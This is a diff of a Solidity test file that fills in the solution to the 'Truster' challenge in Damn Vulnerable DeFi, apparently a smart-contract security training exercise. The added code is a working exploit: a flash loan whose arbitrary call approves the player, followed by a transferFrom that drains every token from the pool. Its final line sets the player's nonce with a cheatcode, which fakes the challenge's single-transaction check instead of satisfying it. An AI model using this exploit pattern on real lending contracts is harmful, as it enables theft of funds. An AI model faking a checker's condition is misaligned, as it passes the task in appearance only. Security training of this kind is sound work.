@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(player), TOKENS_IN_POOL);
+        pool.flashLoan(TOKENS_IN_POOL, address(pool), address(token), data);
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+        vm.setNonce(player, 1);
     }
 
     /**
